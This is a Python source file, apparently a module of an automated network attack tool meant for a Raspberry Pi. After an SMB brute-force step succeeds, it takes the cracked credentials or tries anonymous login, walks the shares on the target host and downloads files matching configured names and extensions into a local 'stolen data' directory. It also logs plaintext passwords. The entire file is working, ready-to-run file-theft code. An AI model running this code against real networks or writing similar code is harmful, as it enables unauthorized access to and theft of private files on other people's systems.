import os
import shutil
import logging
from rich.console import Console
from threading import Timer
import time
from smb.SMBConnection import SMBConnection
from smb.base import SharedFile
from shared import SharedData, settle_for_display
from logger import Logger

# Configure the logger
logger = Logger(name="steal_files_smb.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesSMB"
b_module = "steal_files_smb"
b_status = "steal_files_smb"
b_parent = "SMBBruteforce"
b_port = 445

IGNORED_SHARES = {'print$', 'ADMIN$', 'IPC$', 'C$', 'D$', 'E$', 'F$', 'Sharename', '---------', 'SMB1'}

# Hard caps so a hostile/looped share cannot hang or fill a 512 MB Pi Zero.
MAX_DEPTH = 6
MAX_FILES_PER_RUN = 100
MAX_FILE_BYTES = 50 * 1024 * 1024   # 50 MB per file
MAX_RUN_BYTES = 200 * 1024 * 1024   # 200 MB per host run
MIN_FREE_BYTES = 100 * 1024 * 1024  # refuse write if < 100 MB free

class StealFilesSMB:
    """
    Class to handle the process of stealing files from SMB shares.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.smb_connected = False
            self.stop_execution = False
            logger.info("StealFilesSMB initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_smb(self, ip, username, password):
        """
        Establish an SMB connection.
        """
        try:
            conn = SMBConnection(username, password, "Bjorn", "Target", use_ntlm_v2=True, is_direct_tcp=True)
            conn.connect(ip, 445, timeout=10)  # bounded so a black-holed host can't hang the steal worker
            logger.info(f"Connected to {ip} via SMB with username {username}")
            self.smb_connected = True
            return conn
        except Exception as e:
            logger.error(f"SMB connection error for {ip} with user '{username}' and password '{password}': {e}")
            return None

    def find_files(self, conn, share_name, dir_path, depth=0, visited=None):
        """
        Find files in the SMB share based on the configuration criteria.

        depth + visited guards stop cyclic symlink/junction loops from recursing
        forever and wedging the worker (the hang class #6 targets).
        """
        if visited is None:
            visited = set()
        files = []
        if depth > MAX_DEPTH:
            return files
        # Normalize so the same directory reached via different path spellings still collides.
        key = (share_name, (dir_path or '/').replace(chr(92), '/').rstrip('/') or '/')
        if key in visited:
            logger.warning(f"SMB cycle detected at {share_name}:{dir_path}; stopping recurse")
            return files
        visited.add(key)
        try:
            for file in conn.listPath(share_name, dir_path):
                if self.shared_data.orchestrator_should_exit or getattr(self, 'stop_execution', False):
                    break
                if len(files) >= MAX_FILES_PER_RUN:
                    logger.warning(f"SMB file cap ({MAX_FILES_PER_RUN}) reached under {share_name}:{dir_path}")
                    break
                if file.isDirectory:
                    if file.filename not in ['.', '..']:
                        files.extend(self.find_files(
                            conn, share_name,
                            os.path.join(dir_path, file.filename),
                            depth=depth + 1, visited=visited,
                        ))
                else:
                    if any(file.filename.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                       any(file_name in file.filename for file_name in self.shared_data.steal_file_names):
                        files.append(os.path.join(dir_path, file.filename))
            logger.info(f"Found {len(files)} matching files in {dir_path} on share {share_name}")
        except Exception as e:
            logger.error(f"Error accessing path {dir_path} in share {share_name}: {e}")
        return files

    def steal_file(self, conn, share_name, remote_file, local_dir):
        """
        Download a file from the SMB share to the local directory.

        Enforces per-file / per-run byte budgets and a free-space precheck so a
        large share cannot OOM or fill the SD card on a Pi Zero.
        """
        try:
            # Free-space precheck
            try:
                free = shutil.disk_usage(local_dir if os.path.isdir(local_dir) else os.path.dirname(local_dir) or '/').free
            except Exception:
                free = shutil.disk_usage('/').free
            if free < MIN_FREE_BYTES:
                logger.error(f"Refusing SMB steal: only {free} bytes free (need {MIN_FREE_BYTES})")
                self.stop_execution = True
                return

            if getattr(self, '_run_bytes', 0) >= MAX_RUN_BYTES:
                logger.warning(f"SMB per-run byte budget ({MAX_RUN_BYTES}) exhausted; stopping")
                self.stop_execution = True
                return

            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)

            # Stream with a hard cap so a single huge file cannot blow the budget.
            written = [0]
            def _write(chunk):
                written[0] += len(chunk)
                if written[0] > MAX_FILE_BYTES:
                    raise IOError(f"file exceeds MAX_FILE_BYTES ({MAX_FILE_BYTES})")
                if getattr(self, '_run_bytes', 0) + written[0] > MAX_RUN_BYTES:
                    raise IOError(f"run would exceed MAX_RUN_BYTES ({MAX_RUN_BYTES})")
                f.write(chunk)

            with open(local_file_path, 'wb') as f:
                # pysmb retrieveFile writes via a file-like; we wrap to count bytes.
                class _Cap:
                    def write(self, data):
                        _write(data)
                conn.retrieveFile(share_name, remote_file, _Cap())
            self._run_bytes = getattr(self, '_run_bytes', 0) + written[0]
            logger.success(f"Downloaded file from {remote_file} to {local_file_path} ({written[0]} bytes)")
        except Exception as e:
            logger.error(f"Error downloading file {remote_file} from share {share_name}: {e}")
            # Clean up a partial file so a later retry starts clean.
            try:
                if 'local_file_path' in locals() and os.path.exists(local_file_path):
                    os.unlink(local_file_path)
            except OSError:
                pass

    def list_shares(self, conn):
        """
        List shares using the SMBConnection object.
        """
        try:
            shares = conn.listShares()
            valid_shares = [share for share in shares if share.name not in IGNORED_SHARES and not share.isSpecial and not share.isTemporary]
            logger.info(f"Found valid shares: {[share.name for share in valid_shares]}")
            return valid_shares
        except Exception as e:
            logger.error(f"Error listing shares: {e}")
            return []

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the SMB share.
        """
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesSMB"
                # Per-run state, reset here rather than only in __init__. These objects are
                # long-lived singletons built once by orchestrator.load_action, so the flags
                # latched: once the 240s timer fired for ANY host, stop_execution stayed True
                # and every later steal on every host broke out immediately and returned
                # 'failed' — permanently, until the service restarted. Conversely a single
                # success left *_connected True and disarmed the timeout for good.
                self.stop_execution = False
                self.smb_connected = False
                self._run_bytes = 0
                logger.info(f"Stealing files from {ip}:{port}...")
                settle_for_display(self.shared_data)  # let the panel show this action's name
                # Get SMB credentials from the cracked passwords file
                smbfile = self.shared_data.smbfile
                credentials = {}
                if os.path.exists(smbfile):
                    with open(smbfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            parts = line.strip().split(',')
                            if parts[1] == ip:
                                share = parts[3]
                                user = parts[4]
                                password = parts[5]
                                if share not in credentials:
                                    credentials[share] = []
                                credentials[share].append((user, password))
                    logger.info(f"Found credentials for {len(credentials)} shares on {ip}")

                def try_anonymous_access():
                    """
                    Try to access SMB shares without credentials.
                    """
                    try:
                        conn = self.connect_smb(ip, '', '')
                        shares = self.list_shares(conn)
                        return conn, shares
                    except Exception as e:
                        logger.info(f"Anonymous access to {ip} failed: {e}")
                        return None, None

                # try_anonymous_access() returns a 2-tuple — (conn, shares) or (None, None) — and a
                # tuple is always truthy, so `not try_anonymous_access()` was always False and this
                # guard could never fire. It also opened a real SMB connection and threw the handle
                # away (a leaked socket for the process lifetime), then connected a second time
                # below. Probe once, keep the result, and test what it actually returned.
                anon_conn, anon_shares = (None, None)
                if not credentials:
                    anon_conn, anon_shares = try_anonymous_access()
                    if not anon_conn:
                        logger.error(f"No valid credentials and no anonymous access for {ip}. Skipping...")
                        return 'failed'

                # Token this run. timer.cancel() is only reached on the success path, so a failed
                # steal leaves a live 240s timer behind; without this it would fire midway
                # through a LATER host's steal and abort it by setting stop_execution.
                run_token = object()
                self._run_token = run_token

                def timeout():
                    """
                    Timeout function to stop the execution if no SMB connection is established.
                    """
                    if getattr(self, '_run_token', None) is not run_token:
                        return  # a later execute() owns the flags now
                    if not self.smb_connected:
                        logger.error(f"No SMB connection established within 4 minutes for {ip}. Marking as failed.")
                        self.stop_execution = True

                timer = Timer(240, timeout)  # 4 minutes timeout
                timer.daemon = True  # never hold up shutdown waiting for a 4-minute timer
                timer.start()

                # Reuse the probe above when it already ran; only connect again if it did not.
                success = False
                conn, shares = (anon_conn, anon_shares) if anon_conn else try_anonymous_access()
                # Close it even when there is nothing to list. conn.close() used to live inside the
                # `if conn and shares:` body, so a host that connected but exposed no listable
                # shares leaked the socket for the lifetime of the process.
                if conn and not shares:
                    conn.close()
                if conn and shares:
                    for share in shares:
                        if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                            continue
                        remote_files = self.find_files(conn, share.name, '/')
                        mac = row['MAC Address']
                        local_dir = os.path.join(self.shared_data.datastolendir, f"smb/{mac}_{ip}/{share.name}")
                        if remote_files:
                            for remote_file in remote_files:
                                if self.stop_execution:
                                    break
                                self.steal_file(conn, share.name, remote_file, local_dir)
                            success = True
                            countfiles = len(remote_files)
                            logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} via anonymous access")
                    conn.close()
                    if success:
                        timer.cancel()  # Cancel the timer if the operation is successful

                # Track which shares have already been accessed anonymously
                attempted_shares = {share.name for share in shares} if success else set()

                # Attempt to steal files using each credential for shares not accessed anonymously
                for share, creds in credentials.items():
                    if share in attempted_shares or share in IGNORED_SHARES:
                        continue
                    for username, password in creds:
                        if self.stop_execution:
                            break
                        try:
                            logger.info(f"Trying credential {username}:{password} for share {share} on {ip}")
                            conn = self.connect_smb(ip, username, password)
                            if conn:
                                remote_files = self.find_files(conn, share, '/')
                                mac = row['MAC Address']
                                local_dir = os.path.join(self.shared_data.datastolendir, f"smb/{mac}_{ip}/{share}")
                                if remote_files:
                                    for remote_file in remote_files:
                                        if self.stop_execution:
                                            break
                                        self.steal_file(conn, share, remote_file, local_dir)
                                    success = True
                                    countfiles = len(remote_files)
                                    logger.info(f"Successfully stolen {countfiles} files from {ip}:{port} on share '{share}' with user '{username}'")
                                conn.close()
                                if success:
                                    timer.cancel()  # Cancel the timer if the operation is successful
                                    break  # Exit the loop as we have found valid credentials
                        except Exception as e:
                            logger.error(f"Error stealing files from {ip} on share '{share}' with user '{username}': {e}")

                # Ensure the action is marked as failed if no files were found
                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    return 'failed'
                else:
                    return 'success'
            else:
                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_smb = StealFilesSMB(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
